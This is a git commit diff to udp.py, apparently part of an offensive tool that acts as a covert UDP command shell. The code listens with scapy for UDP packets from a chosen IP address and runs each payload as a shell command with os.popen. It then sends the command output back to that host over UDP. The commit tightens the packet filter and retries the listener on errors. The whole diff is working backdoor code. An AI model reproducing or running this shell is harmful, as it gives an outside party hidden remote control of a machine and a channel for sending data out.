42bf8d2f0aa5c2cabdec076c67b847ebbd35d989
Br34kC0d8 <81061779+Br34kC0d8@users.noreply.github.com>
2021-04-02 13:38:31 +0000

    Update udp.py

--- udp.py
+++ udp.py
@@ -8,10 +8,10 @@ parser = argparse.ArgumentParser()
 parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
 args = parser.parse_args()
 def udpshell(pkt):
-    if pkt[Raw].load and pkt[IP].src == args.destination_ip:
+    if pkt[Raw].load and pkt[IP].src == args.destination_ip and pkt[UDP].sport == 53555:
         udppacket = (pkt[Raw].load).decode('utf-8', errors= 'ignore')
         payload = os.popen(udppacket).readline()
-        udppaket = (IP(dst=args.destination_ip,ttl=TTL)/UDP(sport=53555, dport=60000,)/Raw(load=payload))
+        udppaket = (IP(dst=args.destination_ip,ttl=TTL)/UDP(sport=53555, dport=60000)/Raw(load=payload))
         sr1(udppaket,timeout=0,verbose= 0)
     else:
         pass
@@ -20,4 +20,9 @@ def udpshell(pkt):
 
 
 print('[+]UDP Listener')
-sniff( prn=udpshell, filter="udp", store="0")
+
+
+try:
+    sniff( prn=udpshell, filter="udp", store="0")
+except IndexError:
+    sniff( prn=udpshell, filter="udp", store="0")
